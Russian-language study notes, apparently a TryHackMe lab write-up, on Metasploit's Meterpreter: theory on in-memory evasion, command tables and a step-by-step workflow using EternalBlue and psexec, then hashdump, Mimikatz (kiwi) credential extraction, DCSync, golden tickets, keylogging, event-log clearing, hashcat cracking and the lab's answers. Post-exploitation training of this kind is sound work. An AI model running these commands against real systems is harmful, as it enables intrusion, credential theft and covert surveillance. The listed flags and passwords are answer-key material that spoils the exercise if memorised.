---
title: Meterpreter_Tryhackme
date: 2026-07-28 14:48 +0300
categories:
  - TryHackMe
tags:
  - Обучение
icon:
---
# Meterpreter

## Теория
- **Архитектура**: Работает исключительно в оперативной памяти (in-memory). Не пишет файлы на диск, обходя базовые эвристики антивирусов.
- **Маскировка**: Внедряется в легитимные системные процессы (например, `spoolsv.exe`). В списке загруженных DLL следов Meterpreter отсутствует.
- **Сеть**: Использует зашифрованный канал связи (TLS), скрывая активность от сетевых IDS/IPS.
- **Типы пейлоадов**:
  - *Staged* (двухэтапный): минимальный стегер подтягивает основную нагрузку. Эффективен при ограничениях на размер.
  - *Inline* (одноэтапный): передается целиком за один раз. Стабильнее, но объемнее.
- **Выбор пейлоада**: Зависит от ОС цели, доступного ПО (Python, PHP) и сетевых ограничений. Список доступных пейлоадов: `msfvenom --list payloads | grep meterpreter`.

## Команды

### Базовые и системные
| Команда | Назначение |
| :--- | :--- |
| `sysinfo` / `getuid` | Информация об ОС и текущий контекст пользователя |
| `ps` / `getpid` | Список процессов и текущий PID сессии |
| `migrate <PID>` | Перенос сессии в другой процесс для стабильности |
| `shell` | Переход в системную оболочку (возврат: `Ctrl+Z`) |
| `background` (`bg`) | Сворачивание сессии в фон (возврат: `sessions -i <ID>`) |
| `clearev` | Очистка логов событий Windows |

### Файлы, сеть и шпионаж
| Команда | Назначение |
| :--- | :--- |
| `search -f <имя>` | Быстрый поиск файлов по имени или расширению |
| `upload` / `download` | Загрузка и выгрузка файлов/директорий |
| `ifconfig` / `portfwd` | Просмотр сетевых интерфейсов и проброс портов |
| `keyscan_start` / `dump` | Запуск кейлоггера и выгрузка буфера нажатых клавиш |
| `screenshot` / `record_mic` | Снимок экрана или запись аудио с микрофона |

## ⚡ Практический воркфлоу

### 1. Подготовка и выбор пейлоада
Определяем подходящий пейлоад на основе окружения цели.
```
# Просмотр доступных пейлоадов
msfvenom --list payloads | grep meterpreter

# Запуск эксплойта в консоли Metasploit
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > run
```
### 2. Первичная разведка

Оценка окружения сразу после получения доступа.
```
meterpreter > sysinfo
meterpreter > getuid
```
### 3. Закрепление в системе (Stabilization)

Миграция в стабильный процесс с высокими привилегиями, чтобы избежать потери сессии при падении исходного процесса.
```
meterpreter > ps
meterpreter > migrate <PID_целевого_процесса>
```
### 4. Постэксплуатация и сбор данных
Поиск артефактов, повышение привилегий и сбор информации.
```
meterpreter > getsystem             # Попытка эскалации до NT AUTHORITY\SYSTEM
meterpreter > hashdump              # Дамп NTLM-хешей из SAM-базы
meterpreter > search -f *.txt       # Поиск текстовых файлов (флаги, конфиги)
meterpreter > keyscan_start         # Перехват нажатий клавиш
```
### 5. Подгрузка расширений (Extensions)
Meterpreter поддерживает загрузку дополнительных модулей для глубокой постэксплуатации.
```
# Загрузка Mimikatz (Kiwi) для работы с учетными данными в памяти
meterpreter > load kiwi
meterpreter > creds_all             # Извлечение всех доступных учетных данных
meterpreter > dcsync                # Синхронизация хешей домена (DCSync)
meterpreter > golden_ticket_create  # Создание Golden Ticket

# Загрузка интерпретатора Python для выполнения произвольного кода
meterpreter > load python
meterpreter > python_execute "print('Custom script running')"
```
### 6. Завершение работы

Корректное сохранение сессии или ее завершение.
```
meterpreter > background            # Сворачивание в фон
# или
meterpreter > exit                  # Полное завершение
```
# <span style="color:rgb(255, 0, 0)">Отчет: Post-Exploitation Challenge (Metasploit: Meterpreter)</span>

Для выполнения задач на TryHackMe подключаемся к хосту, используя учетные данные `ballen` / `Password1` через модуль `exploit/windows/smb/psexec`.
## 1. Подключение и первичная разведка

Инициализация эксплойта и получение базовой информации о системе.

```
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS <TARGET_IP>
msf6 > set SMBUser ballen
msf6 > set SMBPass Password1
msf6 > run

meterpreter > sysinfo
meterpreter > getuid
```
## 2. Поиск пользовательской SMB-шары

Для перечисления сетевых ресурсов используем встроенный модуль Metasploit.
```
meterpreter > background
msf6 > use post/windows/gather/enum_shares
msf6 > set SESSION 1
msf6 > run
```

**Ответ:** <mark style="background: #FF5582A6;">speedster</mark>
## 3. Получение NTLM-хеша и пароля пользователя jchambers

Для дампа хешей требуется миграция в процесс с привилегиями `SYSTEM` (например, `lsass.exe` или `services.exe`), иначе команда `hashdump` завершится ошибкой.
```
meterpreter > ps
meterpreter > migrate <PID_процесса_SYSTEM>
meterpreter > hashdump
```
Извлекаем NTLM-хеш пользователя `jchambers` из вывода. Подбор пароля выполняем локально с помощью `hashcat` (режим NTLM, атака по словарю).
```
hashcat -m 1000 -a 0 69596c7aa1e8daee17f8e78870e25a5c /usr/share/wordlists/rockyou.txt
```
- **Ответ (NTLM hash):** <mark style="background: #FF5582A6;">69596c7aa1e8daee17f8e78870e25a5c</mark>
- **Ответ (Cleartext password):** <mark style="background: #FF5582A6;">Trustno1</mark>
## 4. Поиск файлов и извлечение данных

Используем команду `search` для локализации файлов и `cat` для чтения их содержимого.

**Поиск secrets.txt:**
```
meterpreter > search -f secrets.txt
meterpreter > cat "c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt"
```
- **Ответ (Путь к secrets.txt):** <mark style="background: #FF5582A6;">c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt</mark>
- **Ответ (Twitter password):** <mark style="background: #FF5582A6;">KDSvbsw3849!</mark>

**Поиск realsecret.txt:**
```
meterpreter > search -f realsecret.txt
meterpreter > cat "c:\inetpub\wwwroot\realsecret.txt"
```
- **Ответ (Путь к realsecret.txt):** <mark style="background: #FF5582A6;">c:\inetpub\wwwroot\realsecret.txt</mark>
- **Ответ (Real secret):** <mark style="background: #FF5582A6;">The Flash is the fastest man alive</mark>
